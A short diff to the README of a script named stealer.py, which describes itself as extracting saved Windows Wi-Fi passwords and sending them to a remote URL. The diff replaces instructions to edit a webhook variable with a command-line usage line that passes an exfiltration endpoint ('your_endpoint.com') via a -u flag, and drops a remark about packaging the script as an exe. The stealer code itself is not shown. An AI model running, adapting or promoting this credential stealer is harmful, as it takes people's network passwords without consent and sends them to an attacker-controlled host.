@@ -2,10 +2,9 @@
 Extract Windows Wi-Fi Passwords to a Remote URL
 
 # Usage
-To use, simply replace the `url` variable with your webhook and execute the following:
+Supply your URL after the `-u` arg.  
+Set the `-v` arg to print the results.
 
 ```
-python stealer.py
+python stealer.py -u 'https://your_endpoint.com' -v
 ```
-
-If you want to be a fancy pants, you can convert this to an exe :)
